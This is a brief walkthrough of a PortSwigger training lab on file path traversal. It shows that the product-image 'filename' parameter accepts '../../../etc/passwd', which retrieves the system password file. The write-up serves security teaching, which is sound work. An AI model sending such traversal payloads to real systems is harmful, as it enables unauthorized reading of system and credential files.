
# File path traversal, simple case

This lab contains a file path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file.


---------------------------------------------

References: 

- https://portswigger.net/web-security/file-path-traversal



![img](images/File%20path%20traversal,%20simple%20case/1.png)

---------------------------------------------

To retrieve an image the application uses a GET request with the parameter filename:



![img](images/File%20path%20traversal,%20simple%20case/2.png)


To retrieve /etc/passwd:

```
GET /image?filename=../../../etc/passwd 
```



![img](images/File%20path%20traversal,%20simple%20case/3.png)